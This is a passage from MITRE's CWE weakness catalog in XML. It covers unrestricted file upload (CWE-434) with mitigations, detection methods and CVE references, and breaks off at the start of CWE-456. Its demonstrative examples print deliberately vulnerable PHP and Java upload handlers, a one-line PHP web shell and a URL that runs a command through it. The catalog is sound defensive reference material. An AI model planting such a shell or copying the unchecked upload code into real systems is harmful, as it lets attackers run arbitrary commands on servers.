               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>813</Relationship_Target_ID>
               <!--OWASP Top Ten 2010 Category A4 - Insecure Direct Object References--></Relationship>
         </Relationships>
         <Relationship_Notes>
            <Relationship_Note>
               <Text>This can have a chaining relationship with incomplete blacklist /
						permissive whitelist errors when the product tries, but fails, to properly
						limit which types of files are allowed (CWE-183, CWE-184).</Text>
               <Text>This can also overlap multiple interpretation errors for intermediaries,
						e.g. anti-virus products that do not remove or quarantine attachments with
						certain file extensions that can be processed by client systems.</Text>
            </Relationship_Note>
         </Relationship_Notes>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
               <Ordinality_Description>
                  <Text> This can be primary when there is no check at all. </Text>
               </Ordinality_Description>
            </Weakness_Ordinality>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
               <Ordinality_Description>
                  <Text>This is frequently resultant when use of double extensions (e.g.
							".php.gif") bypasses a sanity check.</Text>
                  <Text> This can be resultant from client-side enforcement (CWE-602); some
							products will include web script in web clients to check the filename,
							without verifying on the server side.</Text>
               </Ordinality_Description>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Languages>
               <Language Prevalence="Sometimes" Language_Name="ASP.NET"/>
               <Language Prevalence="Often" Language_Name="PHP"/>
               <Language_Class Language_Class_Description="Language-independent"/>
            </Languages>
            <Architectural_Paradigms>
               <Architectural_Paradigm Architectural_Paradigm_Name="Web-based"/>
            </Architectural_Paradigms>
            <Technology_Classes>
               <Technology_Class Technology_Name="Web-Server" Prevalence="Sometimes"/>
            </Technology_Classes>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Unrestricted File Upload</Term>
               <Alternate_Term_Description>
                  <Text>The "unrestricted file upload" term is used in vulnerability databases
							and elsewhere, but it is insufficiently precise. The phrase could be
							interpreted as the lack of restrictions on the size or number of
							uploaded files, which is a resource consumption issue.</Text>
               </Alternate_Term_Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Time_of_Introduction>
            <Introductory_Phase>Implementation</Introductory_Phase>
            <Introductory_Phase>Architecture and Design</Introductory_Phase>
         </Time_of_Introduction>
         <Likelihood_of_Exploit>Medium to High</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Technical_Impact>Execute unauthorized code or
						commands</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text> Arbitrary code execution is possible if an uploaded file is
							interpreted and executed as code by the recipient. This is especially
							true for .asp and .php extensions uploaded to web servers because these
							file types are often treated as automatically executable, even when file
							system permissions do not specify execution. For example, in Unix
							environments, programs typically cannot run unless the execute bit is
							set, but PHP programs may be executed by the web server without directly
							invoking them on the operating system.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with automated results
						interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Web Application Scanner</Text>
                        <Text>Web Services Scanner</Text>
                        <Text>Database Scanners</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with manual results interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Fuzz Tester</Text>
                        <Text>Framework-based Fuzzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Focused Manual Spotcheck - Focused manual analysis of
									source</Text>
                        <Text>Manual Source Code Review (not inspections)</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Source code Weakness Analyzer</Text>
                        <Text>Context-configured Source Code Weakness Analyzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Architecture / Design Review</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Formal Methods / Correct-By-Construction</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Inspection (IEEE 1028 standard) (can apply to requirements,
									design, source code, etc.)</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Generate a new, unique filename for an uploaded file instead of using
							the user-supplied filename, so that no external input is used at
							all.[R.434.1] [R.434.2]</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Enforcement by Conversion</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>When the set of acceptable objects, such as filenames or URLs, is
							limited or known, create a mapping from a set of fixed input values
							(such as numeric IDs) to the actual filenames or URLs, and reject all
							other inputs.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Consider storing the uploaded files outside of the web document root
							entirely. Then, use other mechanisms to deliver the files dynamically.
							[R.434.2]</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Input Validation</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Assume all input is malicious. Use an "accept known good" input
							validation strategy, i.e., use a whitelist of acceptable inputs that
							strictly conform to specifications. Reject any input that does not
							strictly conform to specifications, or transform it into something that
							does.</Text>
                  <Text>When performing input validation, consider all potentially relevant
							properties, including length, type of input, the full range of
							acceptable values, missing or extra inputs, syntax, consistency across
							related fields, and conformance to business rules. As an example of
							business rule logic, "boat" may be syntactically valid because it only
							contains alphanumeric characters, but it is not valid if the input is
							only expected to contain colors such as "red" or "blue."</Text>
                  <Text>Do not rely exclusively on looking for malicious or malformed inputs
							(i.e., do not rely on a blacklist). A blacklist is likely to miss at
							least one undesirable input, especially if the code's environment
							changes. This can give attackers enough room to bypass the intended
							validation. However, blacklists can be useful for detecting potential
							attacks or determining which inputs are so malformed that they should be
							rejected outright.</Text>
                  <Text>For example, limiting filenames to alphanumeric characters can help to
							restrict the introduction of unintended file extensions.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Define a very limited set of allowable extensions and only generate
							filenames that end in these extensions. Consider the possibility of XSS
							(CWE-79) before allowing .html or .htm file types.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Input Validation</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Ensure that only one extension is used in the filename. Some web
							servers, including some versions of Apache, may process files based on
							inner extensions so that "filename.php.gif" is fed to the PHP
							interpreter.[R.434.1] [R.434.2]</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>When running on a web server that supports case-insensitive filenames,
							perform case-insensitive evaluations of the extensions that are
							provided.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>For any security checks that are performed on the client side, ensure
							that these checks are duplicated on the server side, in order to avoid
							CWE-602. Attackers can bypass the client-side checks by modifying values
							after the checks have been performed, or by changing the client to
							remove the client-side checks entirely. Then, these modified values
							would be submitted to the server.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Do not rely exclusively on sanity checks of file contents to ensure
							that the file is of the expected type and size. It may be possible for
							an attacker to hide code in some file segments that will still be
							executed by the server. For example, GIF images may contain a free-form
							comments field.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Do not rely exclusively on the MIME content type or filename attribute
							when determining how to render a file. Validating the MIME content type
							and ensuring that it matches the extension is only a partial
							solution.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Environment Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Run your code using the lowest privileges that are required to
							accomplish the necessary tasks [R.434.4]. If possible, create isolated
							accounts with limited privileges that are only used for a single task.
							That way, a successful attack will not immediately give the attacker
							access to the rest of the software or its environment. For example,
							database applications rarely need to run as the database administrator,
							especially in day-to-day operations.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-22">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Sandbox or Jail</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Run the code in a "jail" or similar sandbox environment that enforces
							strict boundaries between the process and the operating system. This may
							effectively restrict which files can be accessed in a particular
							directory or which commands can be executed by the software.</Text>
                  <Text>OS-level examples include the Unix chroot jail, AppArmor, and SELinux.
							In general, managed code may provide some protection. For example,
							java.io.FilePermission in the Java SecurityManager allows the software
							to specify restrictions on file operations.</Text>
                  <Text>This may not be a feasible solution, and it only limits the impact to
							the operating system; the rest of the application may still be subject
							to compromise.</Text>
                  <Text>Be careful to avoid CWE-243 and other weaknesses related to jails.
						</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Limited</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>The effectiveness of this mitigation depends on the prevention
							capabilities of the specific sandbox or jail being used and might only
							help to reduce the scope of an attack, such as restricting the attacker
							to certain system calls or limiting the portion of the file system that
							can be accessed. </Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code intends to allow a user to upload a picture to
						the web server. The HTML code that drives the form on the user end has an
						input field of type "file".</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Good_Code">
                     <Code_Example_Language>HTML</Code_Example_Language>
                     <Code>&lt;form action="upload_picture.php" method="post"
								enctype="multipart/form-data"&gt;</Code>
                     <Code/>
                     <Code>Choose a file to upload: </Code>
                     <Code>&lt;input type="file" name="filename"/&gt;</Code>
                     <Code>&lt;br/&gt;</Code>
                     <Code>&lt;input type="submit" name="submit"
								value="Submit"/&gt;</Code>
                     <Code/>
                     <Code>&lt;/form&gt;</Code>
                  </Block>
                  <Text>Once submitted, the form above sends the file to upload_picture.php on
							the web server. PHP stores the file in a temporary location until it is
							retrieved (or discarded) by the server side code. In this example, the
							file is moved to a more permanent pictures/ directory. </Text>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>PHP</Code_Example_Language>
                     <Comment>// Define the target location where the picture being</Comment>
                     <Comment>// uploaded is going to be saved. </Comment>
                     <Code>$target = "pictures/" . basename($_FILES['uploadedfile']['name']); </Code>
                     <Code/>
                     <Comment>// Move the uploaded file to the new location.</Comment>
                     <Code>if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'],
								$target))</Code>
                     <Code>{</Code>
                     <Block>
                        <Code>echo "The picture has been successfully uploaded.";</Code>
                     </Block>
                     <Code>}</Code>
                     <Code>else</Code>
                     <Code>{</Code>
                     <Block>
                        <Code>echo "There was an error uploading the picture, please try
									again.";</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>The problem with the above code is that there is no check regarding
							type of file being uploaded. Assuming that pictures/ is available in the
							web document root, an attacker could upload a file with the name:</Text>
                  <Block Block_Nature="Attack">
                     <Code>malicious.php</Code>
                  </Block>
                  <Text>Since this filename ends in ".php" it can be executed by the web
							server. In the contents of this uploaded file, the attacker could use: </Text>
                  <Block Block_Nature="Attack">
                     <Code_Example_Language>PHP</Code_Example_Language>
                     <Code>&lt;?php</Code>
                     <Block>
                        <Code>system($_GET['cmd']);</Code>
                     </Block>
                     <Code>?&gt;</Code>
                  </Block>
                  <Text>Once this file has been installed, the attacker can enter arbitrary
							commands to execute using a URL such as:</Text>
                  <Block Block_Nature="Attack">
                     <Code>http://server.example.com/upload_dir/malicious.php?cmd=ls%20-l</Code>
                  </Block>
                  <Text>which runs the "ls -l" command - or any other type of command that the
							attacker wants to specify.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-22">
               <Intro_Text>The following code demonstrates the unrestricted upload of a file
						with a Java servlet and a path traversal vulnerability. The HTML code is the
						same as in the previous example with the action attribute of the form
						sending the upload file request to the Java servlet instead of the PHP
						code.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Good_Code">
                     <Code_Example_Language>HTML</Code_Example_Language>
                     <Code>&lt;form action="FileUploadServlet" method="post"
								enctype="multipart/form-data"&gt;</Code>
                     <Code/>
                     <Code>Choose a file to upload: </Code>
                     <Code>&lt;input type="file" name="filename"/&gt;</Code>
                     <Code>&lt;br/&gt;</Code>
                     <Code>&lt;input type="submit" name="submit"
								value="Submit"/&gt;</Code>
                     <Code/>
                     <Code>&lt;/form&gt;</Code>
                  </Block>
                  <Text>When submitted the Java servlet's doPost method will receive the
							request, extract the name of the file from the Http request header, read
							the file contents from the request and output the file to the local
							upload directory.</Text>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>public class FileUploadServlet extends HttpServlet {</Code>
                     <Code/>
                     <Block>
                        <Code>...</Code>
                        <Code/>
                        <Code>protected void doPost(HttpServletRequest request,
									HttpServletResponse response) throws ServletException,
									IOException {</Code>
                        <Code/>
                        <Block>
                           <Code>response.setContentType("text/html");</Code>
                           <Code>PrintWriter out = response.getWriter();</Code>
                           <Code>String contentType = request.getContentType();</Code>
                           <Code/>
                           <Code>// the starting position of the boundary header</Code>
                           <Code>int ind = contentType.indexOf("boundary="); </Code>
                           <Code>String boundary = contentType.substring(ind+9);</Code>
                           <Code/>
                           <Code>String pLine = new String(); </Code>
                           <Code>String uploadLocation = new
										String(UPLOAD_DIRECTORY_STRING); //Constant value</Code>
                           <Code/>
                           <Code>// verify that content type is multipart form data </Code>
                           <Code>if (contentType != null &amp;&amp;
										contentType.indexOf("multipart/form-data") != -1) {</Code>
                           <Code/>
                           <Block>
                              <Code>// extract the filename from the Http header</Code>
                              <Code>BufferedReader br = new BufferedReader(new
											InputStreamReader(request.getInputStream()));</Code>
                              <Code>...</Code>
                              <Code>pLine = br.readLine(); </Code>
                              <Code>String filename =
											pLine.substring(pLine.lastIndexOf("\\"),
											pLine.lastIndexOf("\""));</Code>
                              <Code>...</Code>
                              <Code/>
                              <Code>// output the file to the local upload
											directory</Code>
                              <Code>try {</Code>
                              <Block>
                                 <Code>BufferedWriter bw = new BufferedWriter(new
												FileWriter(uploadLocation+filename, true));</Code>
                                 <Code>for (String line; (line=br.readLine())!=null; )
												{</Code>
                                 <Block>
                                    <Code>if (line.indexOf(boundary) == -1) {</Code>
                                    <Block>
                                       <Code>bw.write(line);</Code>
                                       <Code>bw.newLine();</Code>
                                       <Code>bw.flush();</Code>
                                    </Block>
                                    <Code>}</Code>
                                 </Block>
                                 <Code>} //end of for loop</Code>
                                 <Code>bw.close(); </Code>
                              </Block>
                              <Code/>
                              <Code>} catch (IOException ex) {...}</Code>
                              <Code>// output successful upload response HTML page</Code>
                           </Block>
                           <Code>}</Code>
                           <Code>// output unsuccessful upload response HTML page</Code>
                           <Code>else </Code>
                           <Code>{...}</Code>
                        </Block>
                        <Code>}</Code>
                        <Block>
                           <Code>...</Code>
                        </Block>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>As with the previous example this code does not perform a check on the
							type of the file being uploaded. This could allow an attacker to upload
							any executable file or other file with malicious code.</Text>
                  <Text>Additionally, the creation of the BufferedWriter object is subject to
							relative path traversal (CWE-22, CWE-23). Depending on the executing
							environment, the attacker may be able to specify arbitrary files to
							write to, leading to a wide variety of consequences, from code
							execution, XSS (CWE-79), or system crash.</Text>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2001-0901</Observed_Example_Reference>
               <Observed_Example_Description>Web-based mail product stores ".shtml" attachments
						that could contain SSI</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2002-1841</Observed_Example_Reference>
               <Observed_Example_Description>PHP upload does not restrict file
						types</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-1868</Observed_Example_Reference>
               <Observed_Example_Description>upload and execution of .php
						file</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-1881</Observed_Example_Reference>
               <Observed_Example_Description>upload file with dangerous
						extension</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-0254</Observed_Example_Reference>
               <Observed_Example_Description>program does not restrict file
						types</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2004-2262</Observed_Example_Reference>
               <Observed_Example_Description>improper type checking of uploaded
						files</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2006-4558</Observed_Example_Reference>
               <Observed_Example_Description>Double "php" extension leaves an active php
						extension in the generated filename.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2006-6994</Observed_Example_Reference>
               <Observed_Example_Description>ASP program allows upload of .asp files by
						bypassing client-side checks</Observed_Example_Description>
               <Observed_Example_Link>http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=CVE-2006-6994</Observed_Example_Link>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-3288</Observed_Example_Reference>
               <Observed_Example_Description>ASP file upload</Observed_Example_Description>
               <Observed_Example_Link>http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=CVE-2005-3288</Observed_Example_Link>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2006-2428</Observed_Example_Reference>
               <Observed_Example_Description>ASP file upload</Observed_Example_Description>
               <Observed_Example_Link>http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=CVE-2006-2428</Observed_Example_Link>
            </Observed_Example>
         </Observed_Examples>
         <Functional_Areas>
            <Functional_Area>File Processing</Functional_Area>
         </Functional_Areas>
         <Affected_Resources>
            <Affected_Resource>File/Directory</Affected_Resource>
         </Affected_Resources>
         <Research_Gaps>
            <Research_Gap>
               <Text>PHP applications are most targeted, but this likely applies to other
						languages that support file upload, as well as non-web technologies. ASP
						applications have also demonstrated this problem.</Text>
            </Research_Gap>
         </Research_Gaps>
         <References>
            <Reference Local_Reference_ID="R.434.1">
               <Reference_Author>Richard Stanway (r1CH)</Reference_Author>
               <Reference_Title>Dynamic File Uploads, Security and You</Reference_Title>
               <Reference_Link>http://shsc.info/FileUploadSecurity</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.434.2">
               <Reference_Author>Johannes Ullrich</Reference_Author>
               <Reference_Title>8 Basic Rules to Implement Secure File
						Uploads</Reference_Title>
               <Reference_Date>2009-12-28</Reference_Date>
               <Reference_Link>http://blogs.sans.org/appsecstreetfighter/2009/12/28/8-basic-rules-to-implement-secure-file-uploads/</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.434.3">
               <Reference_Author>Johannes Ullrich</Reference_Author>
               <Reference_Title>Top 25 Series - Rank 8 - Unrestricted Upload of Dangerous File
						Type</Reference_Title>
               <Reference_Publisher>SANS Software Security Institute</Reference_Publisher>
               <Reference_Date>2010-02-25</Reference_Date>
               <Reference_Link>http://blogs.sans.org/appsecstreetfighter/2010/02/25/top-25-series-rank-8-unrestricted-upload-of-dangerous-file-type/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-31" Local_Reference_ID="R.434.4">
               <Reference_Author>Sean Barnum</Reference_Author>
               <Reference_Author>Michael Gegick</Reference_Author>
               <Reference_Title>Least Privilege</Reference_Title>
               <Reference_PubDate>2005-09-14</Reference_PubDate>
               <Reference_Link>https://buildsecurityin.us-cert.gov/daisy/bsi/articles/knowledge/principles/351.html</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-7" Local_Reference_ID="R.434.5">
               <Reference_Author>Mark Dowd</Reference_Author>
               <Reference_Author>John McDonald</Reference_Author>
               <Reference_Author>Justin Schuh</Reference_Author>
               <Reference_Title>The Art of Software Security Assessment</Reference_Title>
               <Reference_Section>Chapter 17, "File Uploading", Page 1068.</Reference_Section>
               <Reference_Edition>1st Edition</Reference_Edition>
               <Reference_Publisher>Addison Wesley</Reference_Publisher>
               <Reference_PubDate>2006</Reference_PubDate>
            </Reference>
         </References>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="PLOVER">
               <Mapped_Node_Name>Unrestricted File Upload</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="OWASP Top Ten 2007">
               <Mapped_Node_Name>Malicious File Execution</Mapped_Node_Name>
               <Mapped_Node_ID>A3</Mapped_Node_ID>
               <Mapping_Fit>CWE_More_Specific</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>1</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>122</CAPEC_ID>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission Submission_Source="Externally_Mined">
               <Submitter>PLOVER</Submitter>
            </Submission>
            <Modification Modification_Source="External">
               <Modifier>Eric Dalci</Modifier>
               <Modifier_Organization>Cigital</Modifier_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Relationships, Other_Notes,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Functional_Areas,
						Likelihood_of_Exploit, Potential_Mitigations,
						Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal" Modification_Importance="Critical">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>converted from Compound_Element to
						Weakness</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Applicable_Platforms,
						Common_Consequences, Demonstrative_Examples, Name, Other_Notes,
						Potential_Mitigations, References, Related_Attack_Patterns,
						Relationship_Notes, Relationships, Type,
						Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated References,
						Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Previous_Entry_Names>
               <Previous_Entry_Name Name_Change_Date="2010-02-16">Unrestricted File
						Upload</Previous_Entry_Name>
            </Previous_Entry_Names>
         </Content_History>
      </Weakness>
                    <Weakness ID="456" Name="Missing Initialization of a Variable" Weakness_Abstraction="Base" Status="Draft">
         <Description>
            <Description_Summary>The software does not initialize critical variables, which
					causes the execution environment to use unexpected values.</Description_Summary>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>909</Relationship_Target_ID>
               <!--Missing Initialization of Resource--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>867</Relationship_Target_ID>
               <!--2011 Top 25 - Weaknesses On the Cusp--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">800</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>808</Relationship_Target_ID>
               <!--2010 Top 25 - Weaknesses On the Cusp--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>452</Relationship_Target_ID>
               <!--Initialization and Cleanup Errors--></Relationship>
            <Relationship>
               <Relationship_Views>
